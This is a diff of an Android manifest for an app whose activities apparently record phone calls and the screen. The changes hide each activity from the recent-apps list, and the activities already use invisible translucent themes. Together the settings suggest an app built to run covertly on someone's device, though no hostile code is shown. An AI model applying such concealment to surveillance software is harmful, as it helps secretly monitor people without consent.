@@ -25,13 +25,15 @@
         android:roundIcon="@mipmap/ic_launcher_round"
         android:supportsRtl="true"
         android:theme="@style/AppTheme"
-        android:excludeFromRecents="true">
+        android:excludeFromRecents="true"
+        >
         <meta-data
             android:name="aia-compat-api-min-version"
             android:value="1" />
 
         <activity android:name="com.view.core.activitys.MainActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
             >
             <!--<intent-filter>-->
                 <!--<action android:name="android.intent.action.MAIN" />-->
@@ -41,6 +43,7 @@
 
         <activity android:name="com.view.core.activitys.SplashActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
             >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
@@ -50,11 +53,18 @@
 
         <activity android:name="com.view.core.activitys.PhoneRecordActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
+            android:excludeFromRecents="true"
             />
 
         <activity android:name="com.view.core.activitys.ScreenRecordActivity"
             android:theme="@android:style/Theme.Translucent.NoTitleBar"
-            />
+            android:excludeFromRecents="true"
+            >
+            <!--<intent-filter>-->
+                <!--<action android:name="android.intent.action.MAIN" />-->
+                <!--<category android:name="android.intent.category.LAUNCHER" />-->
+            <!--</intent-filter>-->
+        </activity>
 
         <service
             android:name="com.view.core.services.PhoneService"
